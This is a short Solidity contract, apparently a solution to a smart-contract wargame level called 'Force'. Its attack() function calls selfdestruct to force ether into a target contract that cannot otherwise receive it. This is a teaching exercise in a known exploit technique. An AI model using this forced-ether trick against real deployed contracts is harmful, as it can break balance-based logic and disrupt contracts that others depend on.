// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Force.sol";

contract CallForce {
    Force force;

    constructor(address _forceAddress) {
        force = Force(_forceAddress);

    }

    function attack() public payable {

      address payable ForceAddress = payable(address(force));
      selfdestruct(ForceAddress);
    }

}